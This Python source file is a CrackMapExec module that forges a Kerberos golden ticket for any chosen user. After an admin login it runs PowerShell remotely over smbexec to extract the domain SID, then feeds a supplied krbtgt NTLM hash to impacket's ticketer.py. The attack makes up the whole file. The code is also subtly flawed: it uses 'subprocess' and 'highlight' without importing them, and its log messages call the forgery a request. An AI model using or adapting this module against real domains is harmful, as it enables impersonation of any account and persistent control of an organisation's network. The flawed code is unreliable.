#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# gettgt module for CME python3
# author of the module : github.com/e1abrador
# Ticketer: https://github.com/fortra/impacket/blob/master/examples/ticketer.py


import os

class CMEModule:
    name = "gettgt"
    description = "Remotely generate a TGT for any user via krbtgt account."
    supported_protocols = ["smb"]
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TARGET_USER     // Target user to generate the TGT.
            KRBTGT_NTLM     // NTLM Hash for krbtgt user.
        '''

        if "TARGET_USER" in module_options:
            self.target_user = module_options["TARGET_USER"]

        if "KRBTGT_NTLM" in module_options:
            self.krbtgt_ntlm = module_options["KRBTGT_NTLM"]

    def on_admin_login(self, context, connection):

        domain = connection.domain
        username = connection.username
        host = connection.host
        nthash = getattr(connection, "nthash", "")
        hostname = connection.hostname

        repo_url = "https://github.com/SecureAuthCorp/impacket"
        repo_path = "/opt/impacket"

        if not os.path.exists(repo_path):
            subprocess.run(["git", "clone", repo_url, repo_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cmd = ["python3", f"{repo_path}/setup.py", "install"]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        tgt_file = self.target_user + ".ccache"

        if os.path.isfile(tgt_file):
            context.log.error(f"{highlight(tgt_file)} exists in the current directory. The TGT won't be requested.")
        else:
            # Extract the SID needed to get the TGT
            check_sid = 'powershell.exe -c "(Get-ADDomain).DomainSID.Value"'
            data = connection.execute(check_sid, True, methods=["smbexec"]).splitlines()
            sid = data[0]
            context.log.info("Trying to get the SID of the domain...")
            context.log.success("Domain SID successfuly extracted: " + sid)
            context.log.info(f"Requesting a TGT for user {highlight(self.target_user)}.")
            os.system(f"ticketer.py -nthash {self.krbtgt_ntlm} -domain-sid {sid} -domain {domain} {self.target_user} >/dev/null 2>&1")
            if os.path.isfile(tgt_file):
                context.log.success(f"Successfuly dumped the TGT to {highlight(tgt_file)}.")
            else:
                context.log.error(f"It was not possible to get a TGT for {self.target_user}.")
